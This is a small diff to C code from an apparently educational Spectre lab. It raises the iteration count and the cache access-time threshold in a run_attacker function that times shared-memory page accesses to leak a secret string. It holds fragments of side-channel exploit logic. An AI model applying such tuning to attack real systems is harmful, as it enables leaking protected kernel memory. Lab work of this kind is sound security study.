@@ -38,7 +38,7 @@ static inline void call_kernel_part2(char *shared_memory, size_t offset) {
 int run_attacker(char *shared_memory) {
     char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
     size_t current_offset = 0;
-    int num_iterations = 1000;
+    int num_iterations = 1500;
 
     printf("Launching attacker\n");
 
@@ -63,7 +63,7 @@ int run_attacker(char *shared_memory) {
 
             for (page = 0; page < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; page++) {
                 uint64_t access_time = time_access(&shared_memory[page * SHD_SPECTRE_LAB_PAGE_SIZE]);
-                if (access_time < 120) {
+                if (access_time < 160) {
                     //printf("access time %ld \n", access_time);
                     break;
                 }
